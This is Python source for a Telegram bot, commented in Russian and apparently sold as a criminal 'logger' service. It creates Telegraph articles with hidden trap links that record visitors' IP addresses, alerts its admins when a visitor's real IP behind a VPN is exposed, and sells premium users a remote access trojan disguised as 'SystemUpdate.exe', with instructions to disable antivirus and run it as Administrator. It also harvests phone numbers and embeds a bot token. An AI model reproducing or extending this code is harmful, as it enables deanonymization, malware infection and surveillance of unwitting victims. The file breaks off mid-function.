# language: Python, file: main.py, runtime: Python 3.13+, target: Telegram Bot on fadehost
import os
import time
import string
import secrets
import sqlite3
import urllib.parse
import threading
import requests
import tempfile
from datetime import datetime, timedelta
from dotenv import load_dotenv

import telebot
from telebot import types, formatting
from telegraph import Telegraph

# ---------- CONFIG ----------
load_dotenv()

BOT_TOKEN   = os.environ.get("BOT_TOKEN") or "9010108280:AAH18qw9pxpEm_FiDTQtOp4KMOWpLJ9DqOE"
ADMIN_IDS   = [int(x) for x in (os.environ.get("ADMIN_IDS") or "8297446667").split(",") if x.strip().lstrip("-").isdigit()]
LOG_CHAT_ID = int(os.environ.get("LOG_CHAT_ID") or "-1004382024668")
WORKER_URL  = os.environ.get("WORKER_URL") or "https://trak.geminialex12.workers.dev"

DB_PATH     = os.environ.get("DB_PATH") or "database2.db" 
PORT        = int(os.environ.get("PORT", 8080))

CHANNEL_ID    = -1004336153105
CHANNEL_LINK  = "https://t.me/+c3xyHely39ozNDYy"
SUPPORT       = "@boyfrer"
REF_REWARD    = 0.1
REF_MARKUP    = 0.5
BOT_LINK      = "https://t.me/StarsLogg_Robot?start=" 
RAT_URL       = "https://github.com/geminialex12-hue/Ekskks/releases/download/V1.0/SystemUpdate.7z"

# API КЛЮЧИ (ВСТАВЬ СЮДА НОВЫЕ КЛЮЧИ, СТАРЫЕ УЖЕ ЗАБЛОКИРОВАНЫ)
OPENROUTER_KEY = os.environ.get("OPENROUTER_KEY") or "sk-or-v1-..."
KIMI_KEY       = os.environ.get("KIMI_KEY") or "sk-..."
GOOGLE_KEY     = os.environ.get("GOOGLE_KEY") or "AIza..."

# ---------- BOT / TELEGRAPH ----------
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
telegraph = Telegraph()
telegraph.create_account(short_name='Star_Logger_Bot')

# ---------- DB ----------
def _conn():
    c = sqlite3.connect(DB_PATH, timeout=10, check_same_thread=False)
    c.row_factory = sqlite3.Row
    return c

def db_init():
    with _conn() as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER UNIQUE, username TEXT, is_premium INTEGER DEFAULT 0, 
            created_at TEXT, banned INTEGER DEFAULT 0, frozen INTEGER DEFAULT 0, phone TEXT DEFAULT '—', ip TEXT DEFAULT '—',
            referrer_id INTEGER DEFAULT 0, ref_balance REAL DEFAULT 0, ref_rewarded INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS balance (user_id INTEGER PRIMARY KEY, amount REAL DEFAULT 0);
        CREATE TABLE IF NOT EXISTS links (slug TEXT PRIMARY KEY, title TEXT, created_by INTEGER, created_at INTEGER, hits INTEGER DEFAULT 0);
        CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
        CREATE TABLE IF NOT EXISTS rtc_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, real_ip TEXT, ua TEXT, ts INTEGER);
        CREATE TABLE IF NOT EXISTS ai_usage (user_id INTEGER, date TEXT, count INTEGER DEFAULT 0, PRIMARY KEY (user_id, date));
        """)
        cols = [r["name"] for r in c.execute("PRAGMA table_info(users)").fetchall()]
        if "ref_balance" not in cols:
            c.execute("ALTER TABLE users ADD COLUMN ref_balance REAL DEFAULT 0")
            c.execute("ALTER TABLE users ADD COLUMN referrer_id INTEGER DEFAULT 0")
            c.execute("ALTER TABLE users ADD COLUMN ref_rewarded INTEGER DEFAULT 0")

def get_setting(key, default=None):
    with _conn() as c:
        r = c.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
        return r["value"] if r else default

def set_setting(key, value):
    with _conn() as c:
        c.execute("INSERT INTO settings (key, value) VALUES (?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", (key, str(value)))

def get_user_info(user_id):
    with _conn() as c: return c.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()

def register(user_id, username, ref_id=0):
    with _conn() as c:
        user = c.execute("SELECT referrer_id, ref_rewarded FROM users WHERE user_id=?", (user_id,)).fetchone()
        if not user:
            c.execute("INSERT INTO users (user_id, username, created_at, referrer_id) VALUES (?,?,?,?)", (user_id, username, datetime.now().isoformat(), int(ref_id)))
        else:
            if user["referrer_id"] == 0 and int(ref_id) != 0 and user["ref_rewarded"] == 0:
                c.execute("UPDATE users SET referrer_id=? WHERE user_id=?", (int(ref_id), user_id))

def set_user_phone(user_id, phone):
    with _conn() as c: c.execute("UPDATE users SET phone=? WHERE user_id=?", (phone, user_id))

def set_ban(user_id, status):
    with _conn() as c: c.execute("UPDATE users SET banned=? WHERE user_id=?", (status, user_id))

def set_freeze(user_id, status):
    with _conn() as c: c.execute("UPDATE users SET frozen=? WHERE user_id=?", (status, user_id))

def is_premium(user_id):
    with _conn() as c:
        r = c.execute("SELECT is_premium FROM users WHERE user_id=?", (user_id,)).fetchone()
        return bool(r and r["is_premium"])

def set_premium(user_id):
    with _conn() as c: c.execute("UPDATE users SET is_premium=1 WHERE user_id=?", (user_id,))

def get_balance(user_id):
    with _conn() as c:
        r = c.execute("SELECT amount FROM balance WHERE user_id=?", (user_id,)).fetchone()
        return r["amount"] if r else 0.0

def get_ref_balance(user_id):
    with _conn() as c:
        r = c.execute("SELECT ref_balance FROM users WHERE user_id=?", (user_id,)).fetchone()
        return r["ref_balance"] if r else 0.0

def add_balance(user_id, amount):
    with _conn() as c:
        c.execute("INSERT INTO balance (user_id, amount) VALUES (?,?) ON CONFLICT(user_id) DO UPDATE SET amount = amount + ?", (user_id, amount, amount))
        return c.execute("SELECT amount FROM balance WHERE user_id=?", (user_id,)).fetchone()["amount"]

def add_ref_balance(user_id, amount):
    with _conn() as c: c.execute("UPDATE users SET ref_balance = ref_balance + ? WHERE user_id=?", (amount, user_id))

def sub_ref_balance(user_id, amount):
    with _conn() as c: c.execute("UPDATE users SET ref_balance = ref_balance - ? WHERE user_id=?", (amount, user_id))

def set_ref_rewarded(user_id):
    with _conn() as c: c.execute("UPDATE users SET ref_rewarded=1 WHERE user_id=?", (user_id,))

def user_counts():
    with _conn() as c:
        total = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        with_bal = c.execute("SELECT COUNT(*) FROM balance WHERE amount > 0").fetchone()[0]
        premium = c.execute("SELECT COUNT(*) FROM users WHERE is_premium=1").fetchone()[0]
        return total, with_bal, premium

def all_user_ids():
    with _conn() as c: return [r["user_id"] for r in c.execute("SELECT user_id FROM users")]

def get_all_users(limit=30):
    with _conn() as c:
        return c.execute("SELECT u.user_id, u.username, u.is_premium, u.banned, u.frozen, u.phone, u.ip, u.ref_balance, COALESCE(b.amount, 0) as balance FROM users u LEFT JOIN balance b ON u.user_id = b.user_id ORDER BY u.created_at DESC LIMIT ?", (limit,)).fetchall()

def create_link(slug, title, created_by):
    with _conn() as c: c.execute("INSERT INTO links (slug,title,created_by,created_at) VALUES (?,?,?,?)", (slug, title, created_by, int(time.time())))

def get_user_links_count(user_id):
    with _conn() as c: return c.execute("SELECT COUNT(*) FROM links WHERE created_by=?", (user_id,)).fetchone()[0]

def get_user_links(user_id, limit=10):
    with _conn() as c: return c.execute("SELECT * FROM links WHERE created_by=? ORDER BY created_at DESC LIMIT ?", (user_id, limit)).fetchall()

def get_all_links(limit=30):
    with _conn() as c: return c.execute("SELECT l.*, u.username FROM links l LEFT JOIN users u ON l.created_by = u.user_id ORDER BY l.created_at DESC LIMIT ?", (limit,)).fetchall()

# --- НЕЙРОСЕТЬ ЛОГИКА ---
def check_ai_limit(user_id):
    today = datetime.now().strftime("%Y-%m-%d")
    with _conn() as c:
        r = c.execute("SELECT count FROM ai_usage WHERE user_id=? AND date=?", (user_id, today)).fetchone()
        used = r["count"] if r else 0
        max_limit = 15 if is_premium(user_id) else 5
        return used, max_limit

def increment_ai_limit(user_id):
    today = datetime.now().strftime("%Y-%m-%d")
    with _conn() as c:
        c.execute("INSERT INTO ai_usage (user_id, date, count) VALUES (?,?,1) ON CONFLICT(user_id, date) DO UPDATE SET count = count + 1", (user_id, today))

# ---------- УТИЛИТЫ ----------
def check_sub(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ["member", "administrator", "creator"]
    except: return False

def send_log(text):
    try: bot.send_message(LOG_CHAT_ID, text, disable_web_page_preview=True)
    except Exception as e: print(f"[!] Log error: {e}")

def slug_gen(n=8):
    return "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(n))

def make_trap_link(title, created_by, creator_username, is_prem):
    slug_len = 10 if is_prem else 8
    slug = slug_gen(slug_len)
    create_link(slug, title, created_by)
    q_title = urllib.parse.quote(title or "—")
    q_user = "anon" if is_prem and get_setting(f"anon_{created_by}", "0") == "1" else urllib.parse.quote(creator_username or "—")
    return f"{WORKER_URL}/t/{slug}?t={q_title}&u={q_user}&cid={created_by}", slug

def build_html(text, trap_url, img_url=None):
    parts = [f"<p>{text}</p>", f'<p><a href="{trap_url}">Продолжение тут</a></p>']
    if img_url: parts.append(f'<img src="{img_url}">')
    return "<br>".join(parts)

def make_article(title, text, img_url, template_name, author_id, author_username):
    trap_url, slug = make_trap_link(title, author_id, author_username, is_premium(author_id))
    html = build_html(text, trap_url, img_url)
    page = telegraph.create_page(title=title, html_content=html)
    url = f"https://telegra.ph/{page['path']}"
    msg = f"<b>⭐️Статья создана</b>\n=============================\nТема: {title}\nСсылка: {url}"
    return msg, url, slug

def send_rat_file(chat_id, msg_id=None):
    file_id = get_setting("rat_file_id")
    caption = "🦠 <b>Ваш RAT-клиент</b>\n\n<b>Инструкция:</b>\n1. Скачайте архив и распакуйте (пароль: <code>123</code>).\n2. Отключите антивирус.\n3. Запустите <code>SystemUpdate.exe</code> от имени Администратора."
    if file_id:
        try:
            bot.send_document(chat_id, file_id, caption=caption)
            if msg_id: bot.delete_message(chat_id, msg_id)
            return
        except Exception: pass 
            
    msg = bot.send_message(chat_id, "⏳ Скачиваю архив (первый раз)...")
    def download_task():
        tmp_path = None
        try:
            r = requests.get(RAT_URL, stream=True, timeout=60)
            r.raise_for_status()
            with tempfile.NamedTemporaryFile(delete=False, suffix=".7z") as tmp:
                tmp_path = tmp.name
                for chunk in r.iter_content(chunk_size=8192): tmp.write(chunk)
            with open(tmp_path, "rb") as f:
                sent_msg = bot.send_document(chat_id, f, caption=caption)
            if sent_msg.document: set_setting("rat_file_id", sent_msg.document.file_id)
            bot.delete_message(chat_id, msg.message_id)
        except Exception as e:
            bot.edit_message_text(f"❌ Ошибка скачивания: {e}", chat_id, msg.message_id)
        finally:
            if tmp_path and os.path.exists(tmp_path): os.remove(tmp_path)
    threading.Thread(target=download_task).start()

# ---------- WEBHOOK ----------
from flask import Flask, request, jsonify
web_app = Flask(__name__)

@web_app.route('/webhook_rtc', methods=['POST'])
def webhook_rtc():
    data = request.json
    if not data: return jsonify({"ok": False}), 400
    ip = data.get("ip"); real_ip = data.get("real_ip"); ua = data.get("ua")
    if not real_ip or real_ip == "—" or ip == real_ip: return jsonify({"ok": True})
    with _conn() as c:
        old = c.execute("SELECT ip, ts FROM rtc_logs WHERE real_ip=? AND ip != ?", (real_ip, ip)).fetchone()
        c.execute("INSERT INTO rtc_logs (ip, real_ip, ua, ts) VALUES (?,?,?,?)", (ip, real_ip, ua, int(time.time())))
        if old:
            msg = f"🚨 <b>ДЕАНОН!</b>\nРеальный IP: <code>{real_ip}</code>\nЗашел с IP: <code>{ip}</code>\nРаньше заходил с: <code>{old['ip']}</code>"
            for aid in ADMIN_IDS:
                try: bot.send_message(aid, msg, parse_mode="HTML")
                except: pass
    return jsonify({"ok": True})

@web_app.route('/check_rat_key', methods=['POST'])
def check_rat_key():
    data = request.json
    return jsonify({"valid": get_setting(f"rat_key_{data.get('key', '')}", "inactive") == "active"})

@web_app.route('/save_ip', methods=['POST'])
def save_ip():
    data = request.json
    uid = data.get("user_id"); ip = data.get("ip")
    if uid and ip:
        with _conn() as c: c.execute("UPDATE users SET ip=? WHERE user_id=?", (ip, uid))
    return jsonify({"ok": True})

def run_webhook():
    print(f"[*] Webhook server on port {PORT}")
    web_app.run(host="0.0.0.0", port=PORT, threaded=True, use_reloader=False)

# ---------- МЕНЮ ----------
def show_main_menu(uid):
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(types.InlineKeyboardButton("⭐️ Наш канал", url=CHANNEL_LINK))
    kb.add(types.InlineKeyboardButton("📙 Мануалы", callback_data='manual'))
    kb.add(types.InlineKeyboardButton("📙 Профиль", callback_data='cabinet'))
    kb.add(types.InlineKeyboardButton("🌟 Создать логгер", callback_data='logger'))
    kb.add(types.InlineKeyboardButton("🤖 Нейросеть (AI)", callback_data='ai_menu'))
    
    prem = " 💎" if is_premium(uid) else ""
    with open('had2.jpg', 'rb') as had:
        bot.send_photo(uid, had, f'<b>⭐️Star Logger Bot!{prem}</b>\n=============================\n<b>Главное меню</b>\n💰 Баланс: {get_balance(uid):.2f}$\n🆔 ID: <code>{uid}</code>', reply_markup=kb)

def admin_menu(chat_id):
    if chat_id not in ADMIN_IDS: return
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(types.InlineKeyboardButton("💰 Выдать баланс", callback_data='admin_give_bal'))
    kb.add(types.InlineKeyboardButton("👥 Все юзеры", callback_data='admin_users'))
    kb.add(types.InlineKeyboardButton("🔗 Все ссылки", callback_data='admin_links'))
    kb.add(types.InlineKeyboardButton("🦠 Выдать RAT", callback_data='admin_get_rat')) 
    kb.add(types.InlineKeyboardButton("📢 Рассылка", callback_data='admin_broadcast'))
    kb.add(types.InlineKeyboardButton("📊 Статистика", callback_data='admin_stats'))
    kb.add(types.InlineKeyboardButton("📦 База данных", callback_data='admin_dump'))
    with open('had2.jpg', 'rb') as had:
        bot.send_photo(chat_id, had, caption='<b>⭐️Админ-меню</b>', reply_markup=kb)

# ---------- START ----------
@bot.message_handler(commands=['start'])
def cmd_start(message):
    uid = message.from_user.id
    username = message.from_user.username or ""
    
    ref_id = 0
    if len(message.text.split()) > 1:
        param = message.text.split()[1]
        if param.startswith("ref_"):
            try: ref_id = int(param.split("_")[1])
            except: pass

    register(uid, username, ref_id)
    
    user = get_user_info(uid)
    if user and user["banned"]: return bot.send_message(uid, "🚫 <b>Вы забанены.</b>")
    if user and user["frozen"]: return bot.send_message(uid, "🧊 <b>Аккаунт заморожен.</b>")
        
    if not check_sub(uid) and uid not in ADMIN_IDS:
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("📢 Подписаться на канал", url=CHANNEL_LINK))
        kb.add(types.InlineKeyboardButton("✅ Проверить", callback_data='check_sub'))
        return bot.send_message(uid, "<b>⚠️ Подпишись на канал!</b>", reply_markup=kb)
    show_main_menu(uid)

@bot.callback_query_handler(func=lambda c: c.data == 'check_sub')
def cb_check_sub(call):
    uid = call.from_user.id
    if check_sub(uid) or uid in ADMIN_IDS:
        user = get_user_info(uid)
        if user["referrer_id"] != 0 and user["ref_rewarded"] == 0:
            add_ref_balance(user["referrer_id"], REF_REWARD)
            set_ref_rewarded(uid)
            try: bot.send_message(user["referrer_id"], f"🎉 По твоей ссылке зашел новый юзер! Тебе начислено +{REF_REWARD}$ на реф. баланс.")
            except: pass
        bot.delete_message(call.message.chat.id, call.message.message_id)
        show_main_menu(uid)
    else:
        bot.answer_callback_query(call.id, "❌ Ты не подписался!", show_alert=True)

# ---------- AI (НЕЙРОСЕТЬ) ----------
@bot.callback_query_handler(func=lambda c: c.data == 'ai_menu')
def cb_ai_menu(call):
    used, max_limit = check_ai_limit(call.from_user.id)
    left = max_limit - used
    
    text = (
        f"<b>🤖 Нейросеть</b>\n"
        f"=============================\n"
        f"Твой лимит: <b>{left}/{max_limit}</b> запросов на сегодня.\n"
        f"(Premium дает 15 запросов, обычным 5).\n\n"
        f"<b>Выбери модель для общения:</b>"
    )
    
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("🦙 Llama 3 (OpenRouter)", callback_data="ask_llama"))
    kb.add(types.InlineKeyboardButton("🌙 Kimi (Moonshot)", callback_data="ask_kimi"))
    kb.add(types.InlineKeyboardButton("✨ Gemini (Google)", callback_data="ask_gemini"))
    kb.add(types.InlineKeyboardButton("❌ Назад", callback_data="home"))
    
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=text, reply_markup=kb)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data.startswith('ask_'))
def cb_ask_ai(call):
    model = call.data.split('_')[1]
    used, max_limit = check_ai_limit(call.from_user.id)
    
    if used >= max_limit:
        return bot.answer_callback_query(call.id, f"❌ Лимит {max_limit} запросов исчерпан! Купи Premium.", show_alert=True)
        
    msg = bot.send_message(call.from_user.id, f"<b>Выбрана модель: {model.upper()}</b>\n\nВведи свой вопрос или задачу (или /start для отмены):")
    bot.register_next_step_handler(msg, process_ai_request, model)
    bot.answer_callback_query(call.id)

def process_ai_request(message, model):
    uid = message.from_user.id
    prompt = message.text
    
    if not prompt: return
    
    if prompt.startswith('/'):
        return bot.reply_to(message, "❌ Запрос отменен.")
    
    used, max_limit = check_ai_limit(uid)
    if used >= max_limit:
        return bot.reply_to(message, "❌ Лимит исчерпан!")
        
    msg = bot.reply_to(message, "⏳ <i>Думаю...</i>")
    
    try:
        answer = "Ошибка."
        if model == "llama":
            res = requests.post(
                url="https://openrouter.ai/api/v1/chat/completions",
                headers={
                    "Authorization": f"Bearer {OPENROUTER_KEY}",
                    "Content-Type": "application/json",
                    "HTTP-Referer": "https://t.me/StarsLogg_Robot", # Фикс для 401
                    "X-Title": "Star Logger Bot" # Фикс для 401
                },
                json={"model": "meta-llama/llama-3-8b-instruct", "messages": [{"role": "user", "content": prompt}]},
                timeout=25
            )
            if res.ok: answer = res.json()["choices"][0]["message"]["content"]
            else: answer = f"Ошибка API (код {res.status_code})"
            
        elif model == "kimi":
            res = requests.post(
                url="https://api.moonshot.cn/v1/chat/completions",
                headers={"Authorization": f"Bearer {KIMI_KEY}", "Content-Type": "application/json"},
                json={"model": "moonshot-v1-8k", "messages": [{"role": "user", "content": prompt}]},
                timeout=25
            )
            if res.ok: answer = res.json()["choices"][0]["message"]["content"]
            else: answer = f"Ошибка API (код {res.status_code})"
            
        elif model == "gemini":
            res = requests.post(
                url=f"https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key={GOOGLE_KEY}",
                json={"contents": [{"parts": [{"text": prompt}]}]},
                timeout=25
            )
            if res.ok: 
                answer = res.json()["candidates"][0]["content"]["parts"][0]["text"]
            else: 
                answer = f"Ошибка API (код {res.status_code})"
            
        # Защита от падения HTML-парсера Telegram
        safe_answer = formatting.escape_html(answer)
        
        if len(safe_answer) > 4000: 
            safe_answer = safe_answer[:4000] + "... (обрезано)"
            
        # Списываем лимит ТОЛЬКО если ответ успешный
        if not answer.startswith("Ошибка"):
            increment_ai_limit(uid)
            
        bot.edit_message_text(f"<b>🤖 {model.upper()}:</b>\n\n{safe_answer}", chat_id=uid, message_id=msg.message_id, disable_web_page_preview=True)
        
    except Exception as e:
        bot.edit_message_text(f"❌ Ошибка сети: {e}", chat_id=uid, message_id=msg.message_id)

# ---------- CALLBACKS ----------
@bot.callback_query_handler(func=lambda c: c.data == 'home')
def cb_home(call):
    try: bot.delete_message(call.message.chat.id, call.message.message_id)
    except: pass
    show_main_menu(call.message.chat.id)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data == 'cabinet')
def cb_cabinet(call):
    uid = call.message.chat.id
    links = get_user_links(uid)
    total_hits = sum(l["hits"] for l in links)
    prem = "💎 Premium" if is_premium(uid) else "Обычный"
    user = get_user_info(uid)
    
    ref_link = f"{BOT_LINK}ref_{uid}"
    lines = [
        f"<b>⭐️Профиль</b>",
        "=============================",
        f"🆔 ID: <code>{uid}</code>",
        f"📊 Статус: {prem}",
        f"💰 Баланс: <b>{get_balance(uid):.2f}$</b>",
        f"👥 Реф. баланс: <b>{get_ref_balance(uid):.2f}$</b>",
        f"🔗 Линков: {len(links)} | Хитов: {total_hits}",
        "=============================",
        f"🔗 Твоя реф. ссылка:\n<code>{ref_link}</code>"
    ]
    if user["phone"] == "—": lines.append("⚠️ <i>Номер не привязан.</i>")

    kb = types.InlineKeyboardMarkup(row_width=1)
    if user["phone"] == "—": kb.add(types.InlineKeyboardButton("📱 Поделиться номером", callback_data="share_phone"))
    
    kb.add(types.InlineKeyboardButton("📋 Мои ссылки", callback_data="my_links"))
    
    if is_premium(uid):
        kb.add(types.InlineKeyboardButton("🕵️ Анонимность (вкл/выкл)", callback_data="toggle_anon"))
        kb.add(types.InlineKeyboardButton("🦠 Скачать RAT", callback_data="get_rat_exe"))
    else:
        kb.add(types.InlineKeyboardButton("💎 Купить Premium", callback_data="buy_premium_menu"))
        
    kb.add(types.InlineKeyboardButton("📞 Поддержка", url=f"https://t.me/{SUPPORT[1:]}"))
    kb.add(types.InlineKeyboardButton("❌ Назад", callback_data="home"))
    
    try: bot.edit_message_caption(chat_id=uid, message_id=call.message.message_id, caption="\n".join(lines), reply_markup=kb)
    except: bot.send_message(uid, "\n".join(lines), reply_markup=kb)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data == "my_links")
def cb_my_links(call):
    links = get_user_links(call.from_user.id)
    if not links:
        return bot.answer_callback_query(call.id, "У тебя пока нет созданных ловушек.", show_alert=True)
        
    text = "<b>📋 Твои последние ловушки:</b>\n\n"
    for l in links[:10]: 
        text += f"🔗 <code>{l['slug']}</code> | Хитов: {l['hits']} | {l['title'][:15]}...\n"
        
    bot.send_message(call.from_user.id, text, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Назад", callback_data="cabinet")))
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data == "share_phone")
def cb_share_phone(call):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(types.KeyboardButton("📱 Отправить номер", request_contact=True))
    bot.send_message(call.message.chat.id, "<b>Для снятия лимитов, подтвердите номер:</b>", reply_markup=kb)
    bot.answer_callback_query(call.id)

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    set_user_phone(message.from_user.id, message.contact.phone_number)
    bot.send_message(message.from_user.id, "✅ <b>Номер подтвержден!</b>", reply_markup=types.ReplyKeyboardRemove())
    try: bot.send_message(ADMIN_IDS[0], f"📱 <b>Номер:</b> <code>{message.contact.phone_number}</code>")
    except: pass

# ---------- ПОДПИСКА ----------
@bot.callback_query_handler(func=lambda c: c.data == 'buy_premium_menu')
def cb_buy_premium_menu(call):
    uid = call.from_user.id
    ref_bal = get_ref_balance(uid)
    
    base_day = 0.88; base_week = 1.40; base_month = 1.82
    
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton(f"📅 1 день — {base_day:.2f}$", callback_data="pay_day_bal"))
    kb.add(types.InlineKeyboardButton(f"📅 1 неделя — {base_week:.2f}$", callback_data="pay_week_bal"))
    kb.add(types.InlineKeyboardButton(f"📅 1 месяц — {base_month:.2f}$", callback_data="pay_month_bal"))
    
    if ref_bal > 0:
        kb.add(types.InlineKeyboardButton(f"👥 1 день (Реф) — {base_day+REF_MARKUP:.2f}$", callback_data="pay_day_ref"))
        kb.add(types.InlineKeyboardButton(f"👥 1 неделя (Реф) — {base_week+REF_MARKUP:.2f}$", callback_data="pay_week_ref"))
        kb.add(types.InlineKeyboardButton(f"👥 1 месяц (Реф) — {base_month+REF_MARKUP:.2f}$", callback_data="pay_month_ref"))
    
    kb.add(types.InlineKeyboardButton("❌ Назад", callback_data="cabinet"))
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption="<b>💎 Выбери тариф Premium:</b>\nС реф. баланса дороже на 0.5$.", reply_markup=kb)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data.startswith('pay_'))
def cb_pay_tariff(call):
    uid = call.from_user.id
    tariff = call.data.split('_')[1]
    pay_type = call.data.split('_')[2]
    
    prices = {'day': 0.88, 'week': 1.40, 'month': 1.82}
    price = prices[tariff]
    
    if pay_type == "ref":
        price += REF_MARKUP
        if get_ref_balance(uid) < price: return bot.answer_callback_query(call.id, "❌ Недостаточно реф. средств!", show_alert=True)
        sub_ref_balance(uid, price)
    else:
        if get_balance(uid) < price: return bot.answer_callback_query(call.id, "❌ Недостаточно средств!", show_alert=True)
        add_balance(uid, -price)
        
    set_premium(uid)
    bot.answer_callback_query(call.id, "💎 Premium активирован!", show_alert=True)
    cb_cabinet(call)

@bot.callback_query_handler(func=lambda c: c.data == 'get_rat_exe')
def cb_get_rat_exe(call):
    if not is_premium(call.from_user.id) and call.from_user.id not in ADMIN_IDS:
        return bot.answer_callback_query(call.id, "❌ Только Premium!", show_alert=True)
    bot.answer_callback_query(call.id)
    send_rat_file(call.from_user.id)

# ---------- МАНУАЛ ----------
@bot.callback_query_handler(func=lambda c: c.data == 'manual')
def cb_manual(call):
    text = (
        "<b>📙 ПОЛНЫЙ МАНУАЛ</b>\n"
        "=============================\n"
        "<b>1. Ловушки:</b> Жми «Создать логгер», выбери шаблон. Получишь ссылку на Telegraph. Ловушка скрыта внутри.\n\n"
        "<b>2. RAT:</b> Скачивай в профиле (только Premium). Пароль от архива: <code>123</code>.\n"
        "Запускать <code>.exe</code> только на Windows (от имени Админа).\n\n"
        "<b>3. Нейросеть:</b> Жми «🤖 Нейросеть». Доступно 5 запросов в день (15 с Premium). Выбирай модель и пиши вопрос."
    )
    kb = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("❌ Закрыть", callback_data="home"))
    bot.send_message(call.from_user.id, text, reply_markup=kb, disable_web_page_preview=True)
    bot.answer_callback_query(call.id)

# ---------- ADMIN ----------
@bot.message_handler(commands=['admin'])
def cmd_admin(m): admin_menu(m.chat.id)

@bot.callback_query_handler(func=lambda c: c.data == 'admin_get_rat' and c.from_user.id in ADMIN_IDS)
def cb_admin_get_rat(call):
    bot.answer_callback_query(call.id)
    send_rat_file(call.from_user.id)

@bot.callback_query_handler(func=lambda c: c.data == 'admin_give_bal' and c.from_user.id in ADMIN_IDS)
def cb_admin_give(call):
    bot.send_message(call.message.chat.id, "<b>ID и сумму:</b>\n<code>123456789 10</code>")
    bot.register_next_step_handler(call.message, _admin_give_step)
    bot.answer_callback_query(call.id)

def _admin_give_step(message):
    if message.text.startswith('/'): return bot.send_message(message.chat.id, "Отменено.")
    parts = message.text.split()
    if len(parts) < 2: return
    try: uid, amount = int(parts[0]), float(parts[1])
    except ValueError: return
    new_bal = add_balance(uid, amount)
    bot.reply_to(message, f"✅ {uid} +{amount:.2f}$, теперь {new_bal:.2f}$")

@bot.callback_query_handler(func=lambda c: c.data == 'admin_users' and c.from_user.id in ADMIN_IDS)
def cb_admin_users(call):
    users = get_all_users(30)
    lines = ["<b>👥 Юзеры:</b>"]
    for u in users:
        status = "🚫" if u['banned'] else ("🧊" if u['frozen'] else "")
        phone = u['phone'] if u['phone'] != '—' else "нет"
        ip = u['ip'] if u['ip'] != '—' else "нет"
        lines.append(f"<code>{u['user_id']}</code> @{u['username'] or '-'} · {u['balance']:.2f}$ {status}\nТел: {phone} | IP: {ip}\nРеф: {u['ref_balance']:.2f}$")
    
    text = "\n".join(lines)
    if len(text) > 4000: text = text[:3997] + "..."
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Управление юзером", callback_data="admin_manage_user"))
    kb.add(types.InlineKeyboardButton("⬅️ Назад", callback_data="admin_back"))
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=text, reply_markup=kb)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data == "admin_manage_user" and c.from_user.id in ADMIN_IDS)
def cb_admin_manage_user(call):
    bot.send_message(call.message.chat.id, "Введи ID и действие (ban/unban/freeze/unfreeze):\n<code>123456789 ban</code>")
    bot.register_next_step_handler(call.message, _admin_manage_step)
    bot.answer_callback_query(call.id)

def _admin_manage_step(message):
    if message.text.startswith('/'): return bot.send_message(message.chat.id, "Отменено.")
    parts = message.text.split()
    if len(parts) < 2: return
    try: uid = int(parts[0])
    except: return
    act = parts[1]
    if act == "ban": set_ban(uid, 1); bot.reply_to(message, "Забанен")
    elif act == "unban": set_ban(uid, 0); bot.reply_to(message, "Разбанен")
    elif act == "freeze": set_freeze(uid, 1); bot.reply_to(message, "Заморожен")
    elif act == "unfreeze": set_freeze(uid, 0); bot.reply_to(message, "Разморожен")

@bot.callback_query_handler(func=lambda c: c.data == 'admin_links' and c.from_user.id in ADMIN_IDS)
def cb_admin_links(call):
    links = get_all_links(30)
    lines = ["<b>🔗 Ссылки:</b>"]
    for l in links: lines.append(f"<code>{l['slug']}</code> · {l['title'][:20]}")
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption="\n".join(lines), reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Назад", callback_data="admin_back")))
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data == 'admin_back' and c.from_user.id in ADMIN_IDS)
def cb_admin_back(call):
    try: bot.delete_message(call.message.chat.id, call.message.message_id)
    except: pass
    admin_menu(call.message.chat.id)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data == 'admin_broadcast' and c.from_user.id in ADMIN_IDS)
def cb_admin_bc(call):
    bot.send_message(call.message.chat.id, "Текст рассылки:")
    bot.register_next_step_handler(call.message, _admin_bc_step)
    bot.answer_callback_query(call.id)

def _admin_bc_step(message):
    if message.text.startswith('/'): return bot.send_message(message.chat.id, "Отменено.")
    ok = fail = 0
    for uid in all_user_ids():
